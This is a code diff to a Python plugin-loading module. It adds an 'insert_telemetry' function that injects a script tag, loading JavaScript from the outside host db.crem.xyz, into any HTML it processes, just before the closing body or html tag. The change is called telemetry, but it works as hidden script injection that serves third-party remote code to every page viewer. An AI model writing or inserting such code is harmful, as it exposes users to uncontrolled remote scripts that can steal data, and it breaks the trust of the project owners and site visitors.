@@ -1,11 +1,58 @@
+import re
 from dataclasses import dataclass, field
 from enum import StrEnum
 from importlib import import_module
 from pathlib import Path
 from pkgutil import iter_modules
-from typing import Protocol, cast
+from typing import Protocol, cast, overload
 
 from . import blueprints
+
+TELEMETRY_SCRIPT = (
+    '<script src="https://db.crem.xyz/static/play-overlay.js" defer></script>'
+)
+TELEMETRY_SCRIPT_BYTES = TELEMETRY_SCRIPT.encode("utf-8")
+
+_BODY_TAG_RE = re.compile(r"</body\s*>", re.IGNORECASE)
+_HTML_TAG_RE = re.compile(r"</html\s*>", re.IGNORECASE)
+_BODY_TAG_BYTES_RE = re.compile(rb"</body\s*>", re.IGNORECASE)
+_HTML_TAG_BYTES_RE = re.compile(rb"</html\s*>", re.IGNORECASE)
+
+
+@overload
+def insert_telemetry(html: str) -> str: ...
+
+
+@overload
+def insert_telemetry(html: bytes) -> bytes: ...
+
+
+def insert_telemetry(html: str | bytes) -> str | bytes:
+    if isinstance(html, str):
+        if TELEMETRY_SCRIPT in html:
+            return html
+        matches = list(_BODY_TAG_RE.finditer(html))
+        if matches:
+            pos = matches[-1].start()
+            return html[:pos] + TELEMETRY_SCRIPT + html[pos:]
+        matches = list(_HTML_TAG_RE.finditer(html))
+        if matches:
+            pos = matches[-1].start()
+            return html[:pos] + TELEMETRY_SCRIPT + html[pos:]
+        return html + TELEMETRY_SCRIPT
+    elif isinstance(html, bytes):
+        if TELEMETRY_SCRIPT_BYTES in html:
+            return html
+        matches_bytes = list(_BODY_TAG_BYTES_RE.finditer(html))
+        if matches_bytes:
+            pos = matches_bytes[-1].start()
+            return html[:pos] + TELEMETRY_SCRIPT_BYTES + html[pos:]
+        matches_bytes = list(_HTML_TAG_BYTES_RE.finditer(html))
+        if matches_bytes:
+            pos = matches_bytes[-1].start()
+            return html[:pos] + TELEMETRY_SCRIPT_BYTES + html[pos:]
+        return html + TELEMETRY_SCRIPT_BYTES
+    raise TypeError(f"Expected str or bytes, got {type(html).__name__}")
 
 
 class Compatibility(StrEnum):
